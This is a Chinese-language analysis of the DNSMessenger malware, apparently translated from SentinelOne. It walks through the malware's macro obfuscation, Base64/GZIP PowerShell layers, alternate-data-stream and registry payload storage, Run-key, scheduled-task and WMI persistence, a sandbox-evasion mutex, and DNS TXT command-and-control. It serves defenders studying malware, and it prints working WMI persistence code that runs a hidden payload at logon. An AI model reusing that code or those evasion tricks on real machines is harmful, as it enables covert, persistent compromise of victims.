## 写在前面的话

**在这篇文章中，我将给大家介绍一种通过分析DNSMessenger恶意软件提取的方法，通过这个例子结果，你们可以讨论我使用的方法，并思考每个步骤的过程。**

## 源代码

这个恶意软件发现于一个`SHA-256 hash:
340795d1f2c2bdab1f2382188a7b5c838e0a79d3f059d2db9eb274b0205f6981`的恶意Word文档中。为了从宏中提取VBA源代码，我使用了`OLETools`工具，安装`OLETools`之后，只需运行命令`olevba
<filepath>`就可以显示出宏。

## VB和嵌入式PowerShell

在这里我们发现了一个问题，攻击者为了让脚本更难被破解嵌入了大量换行间距，广泛分散内容，在使用`OLETools`显示宏之后，我们还有花大量时间来寻找真正有用的脚本。作者还使用了无偿字符串连接来破坏简单的字符串签名——这有助于攻击者逃避静态分析工具，寻找像`"winmgmts:\\.\root\cimv2"`这样的字符串，并可能会被以下内容抛出：`"w"
& "" & "in" & "" & "mgm" & "" & "ts" & "" & ":" & "" & "\\" & "." & "\r" & ""
& "oot\c" & "" & "imv" & "" & "2"`我们使用`lStr`命令对变量进行解码：`lStr = "powershell -ep
bypass -C ""$data =
[System.Convert]::FromBase64String('H4sIAAAAAAAEAO1da3PayNL+7l+hol ... many
many more lines ...`如图：  
![1.png](https://image.3001.net/images/20180828/1535458891_5b853e4b7d30d.png!small)继续进一步研究。

### 解开Base64

下面是一个简单的Python3脚本，用于解码前面提到的`Base64 blob`

    
    
    import base64
    import sys
    with open(sys.argv[1]) as f:
        encoded = f.read()
    sys.stdout.write(base64.b64decode(encoded))
    

解码后，生成的内容仍然无法读取。但我们可以知道其内容是GZIP格式的：存储在`lStr`中的VB字符串使用`System.IO.Compression.GZipStream`对象解压缩解码内容的命令；另一种识别方式是通过其`（magic
number）`，即开始文件签名`（1F8B）`；我们还可以在Unix机器上使用`file
<filepath>`命令来确定文件类型。现在，我们将使用`gunzip
<filepath>`解压缩内容，这会创建一个具有相同名称的解压缩文件，打开解压缩的文件将显示模糊的`PowerShell`代码（第2层），经过一些清理和重构后，脚本行为的一些细节会变得更加明显。

## Base64解码和解压缩的PowerShell

滚动解压缩的脚本你会找到另一个Base64 blob，它充当下一阶段的payload，我将其命名为第3层payload。

### 存储payload

如果受害者具有`PowerShell
3.0`或更高版本，则该脚本将编码的第3层`payload`存储在名为`kernel32.dll`的备用数据流中，位于`%PROGRAMDATA%\Windows\`。恶意软件作者通常用ADS来隐藏数据，只需列出其文件，你就无法找到payload。如果受害者具有较旧版本的PowerShell，则该脚本会在注册表中为密钥添加名为`Path`的新属性，以存储有效内容。如果用户具有管理员权限，有效内容将存储在`HKLM:Software\Microsoft\Windows\CurrentVersion`中，否则，它将存储在`HKCU:Software\Microsoft\Windows`中。

### 注册表键

这些脚本在`%PROGRAMDATA%\Windows\`中创建了一个名为`kernel32.vbs`的备用数据流，并向其写入代码，该代码可以从上一步中存储的任何位置检索并执行payload。每次用户登录30分钟后，攻击者会修改运行注册表项以执行`kernel32.vbs`。如果用户具有管理员权限，则目标密钥为`HKLM:Software\Microsoft\Windows\CurrentVersion\Run\`，
否则，目标密钥为`HKCU:Software\Microsoft\Windows\CurrentVersion\Run\`。

### 创建新的WMI对象

如果用户具有管理员权限，则脚本将创建永久WMI事件，并且监视用户登录，30分钟之后执行编码的payload。以下是代码。首先，它会删除现有的：

    
    
    gwmi __eventFilter -namespace root\subscription | Remove-WmiObject
    gwmi CommandLineEventConsumer -Namespace root\subscription | Remove-WmiObject
    gwmi __filtertoconsumerbinding -Namespace root\subscription | Remove-WmiObject
    

然后它会创建自己。如果你有`PowerShell 3.0`或更高版本，逻辑上讲是这样的：

    
    
    $event_filter = Set-WmiInstance -Computername $env:COMPUTERNAME -Namespace “root\subscription” -Class __EventFilter -Arguments @{Name = $kernel32_filter; EventNamespace = “root\CIMV2”; QueryLanguage = “WQL”; Query = “Select * from __InstanceCreationEvent within 30 where targetInstance isa 'Win32_LogonSession'”}
    $event_consumer = Set-WmiInstance -Computername $env:COMPUTERNAME -Namespace “root\subscription” -Class CommandLineEventConsumer -Arguments @{Name = $kernel32_consumer; ExecutablePath = “C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe”; CommandLineTemplate = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -C `"IEX `$(Get-Content -Path $windows_path -Stream $kernel32_dll|Out-String)`""}
    Set-WmiInstance -Computername $env:COMPUTERNAME -Namespace “root\subscription” -Class __FilterToConsumerBinding -Arguments @{Filter = $event_filter; Consumer = $event_consumer}
    

### 预定任务

该脚本还会创建一个计划任务，以便在用户登录后30分钟运行恶意软件。用于启动恶意软件的方法仅略有不同，具体取决于用户是否具有管理员权限。如果用户是非管理员，
wscript 则用于执行内容 `kernel32.vbs`。否则，使用 `Invoke-Expression cmdlet`。

## DNS查询

现在我们已经讨论了攻击者实现恶意软件持久性的各种方法，让我们来看看下一个编码的payload是由什么组成的。在Base64解码和一些手动反混淆之后，你会注意到函数逻辑开头的这段代码，它包含了`if`之后的许多其他代码。

    
    
    [bool]$flag = $false;
    $mutex = New-Object System.Threading.Mutex($true, "SourceFireSux", [ref] $flag);
    if (!$flag) { exit; }
    

乍一看，似乎这个`if`之后的恶意代码应该永远不会执行，但由于构造`System.Threading.Mutex`的语义，静态分析工具或弱动态分析系统可能无法实现将`$flag`变为`true`。从`Source
Fire`来看，可能是加入了这种特定的逃避技术，以阻止`Source
Fire`分析。很明显，代码使用`nslookup`命令重复查询DNS文本记录，这些查询的响应决定了程序的行为：1.`"idle"`
会导致进程在继续之前在3500到5400秒之间休眠2.`"stop"` 会提示进程退出3.继续4.使用`Invoke-Expression`执行查询响应由于这些领域不再具有活性，我们将不得不依赖先前`Edmund Brumaghin`和`Colin Grady at
Talos`的数据，因为它们进行了原始分析。

## 命令与控制通信

为了响应DNS文本查询，你必须发送另一个payload，它包括一个gzip压缩和Base64编码的字符串，以及对第3层中`dec`函数的调用，用以解开它，所得的结果将传递给要执行的`Invoke-Expression`命令行。根据`Talos`的分析，这个payload重定向`STDIN`，`STDOUT`和`STDERR`，以便攻击者可以读取和写入命令行处理器，payload执行更多DNS查询命令，并与命令和控制服务器建立通信通道。从这里开始，攻击者可以通过DNS文本查询、响应发送要在受害者计算机的命令行，来解释器上执行的命令，并接收这些命令的结果。

## 最后的话

这是一段较旧但有趣的恶意软件分析，我将其分解为4个不同的层并描述了每个层的属性，具体来说，是回顾了此恶意软件所采用的混淆方式，以及它用于实现持久性的不同方法。

 ***参考来源[sentinelone](a%20href=)，由周大涛编译，转载请注明来自FreeBuf.COM**

